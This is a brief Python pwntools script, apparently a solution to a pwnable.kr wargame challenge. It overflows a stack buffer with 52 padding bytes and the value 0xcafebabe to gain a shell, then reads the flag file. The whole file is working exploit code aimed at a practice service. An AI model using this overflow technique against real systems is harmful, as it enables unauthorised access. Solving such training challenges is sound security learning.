from pwn import *
from pwnlib.util.packing import *

conn = remote('pwnable.kr', 9000)
b = b'A' * 52 + p32(0xcafebabe)

conn.sendline(b)
time.sleep(2)
conn.sendline(b'cat flag')
conn.shutdown()
print(conn.recvall())
